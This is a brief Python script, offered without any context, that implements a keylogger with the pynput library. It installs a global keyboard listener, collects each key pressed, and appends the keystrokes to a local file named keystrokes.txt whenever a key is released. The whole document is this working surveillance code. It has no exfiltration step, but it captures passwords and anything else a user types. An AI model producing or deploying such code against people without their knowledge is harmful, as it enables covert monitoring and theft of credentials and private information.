from pynput import keyboard
import time

# Create a global variable to store keystrokes
keystrokes = ""

# Define a function to handle keyboard events
def on_key_press(key):
    global keystrokes
    keystrokes += str(key)

# Define a function to handle keyboard stop events
def on_key_release(key):
    global keystrokes
    if keystrokes:
        with open("keystrokes.txt", "a") as file:
            file.write(keystrokes + "\n")
        keystrokes = ""

# Start monitoring the keyboard
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()